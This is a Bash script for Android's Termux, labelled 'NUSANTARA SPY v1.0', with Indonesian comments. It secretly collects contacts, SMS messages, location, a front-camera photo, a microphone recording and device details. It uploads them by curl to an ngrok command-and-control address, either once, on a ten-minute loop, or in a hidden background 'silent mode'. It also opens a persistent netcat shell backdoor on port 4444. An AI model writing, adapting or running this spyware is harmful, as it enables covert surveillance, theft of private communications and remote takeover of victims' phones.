#!/bin/bash

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Cek termux-api
if ! command -v termux-sms-list &> /dev/null; then
    echo -e "${RED}[!] Termux:API tidak terdeteksi. Install dulu.${NC}"
    exit 1
fi

# Konfigurasi C2
C2_URL="http://0.tcp.ngrok.io"   # ganti dengan endpoint ngrok Anda

function collect_data() {
    mkdir -p output
    echo "[*] Mengambil info perangkat..."
    termux-telephony-deviceinfo > output/device.json
    echo "[*] Mengambil kontak..."
    termux-contact-list > output/contacts.json
    echo "[*] Mengambil SMS..."
    termux-sms-list > output/sms.json
    echo "[*] Mengambil lokasi..."
    termux-location > output/location.json
    echo "[*] Mengambil foto kamera depan..."
    termux-camera-photo -c 0 output/camera.jpg
    echo "[*] Merekam suara 5 detik..."
    termux-microphone-record -d 5 output/audio.mp3
    echo "[*] Info baterai..."
    termux-battery-status > output/battery.json
    echo "[+] Data tersimpan di folder output/"
}

function send_to_c2() {
    echo "[*] Mengirim data ke $C2_URL..."
    tar -czf data.tar.gz output/
    curl -X POST -F "file=@data.tar.gz" $C2_URL/upload
    rm data.tar.gz
}

function live_stream() {
    while true; do
        collect_data
        send_to_c2
        sleep 600  # setiap 10 menit
    done
}

function quick_scan() {
    collect_data
    echo "[+] Selesai. Lihat folder output/"
}

function remote_shell() {
    echo "[*] Membuka reverse shell di port 4444..."
    nohup bash -c 'while true; do nc -l -p 4444 -e /bin/bash; done' &
    echo "[+] Backdoor aktif. Hubungkan dengan: nc <IP> 4444"
}

# Menu
echo -e "${GREEN}============================${NC}"
echo -e "${GREEN}  NUSANTARA SPY v1.0${NC}"
echo -e "${GREEN}============================${NC}"
echo "1. Quick Scan (data lokal)"
echo "2. Live Stream ke C2 (setiap 10 menit)"
echo "3. Silent Mode (background, C2)"
echo "4. Remote Shell (port 4444)"
read -p "Pilih [1-4]: " pilihan

case $pilihan in
    1) quick_scan ;;
    2) live_stream ;;
    3) nohup bash -c 'while true; do collect_data; send_to_c2; sleep 600; done' &>/dev/null &
       echo "[+] Silent mode berjalan di background." ;;
    4) remote_shell ;;
    *) echo "Pilihan salah." ;;
esac
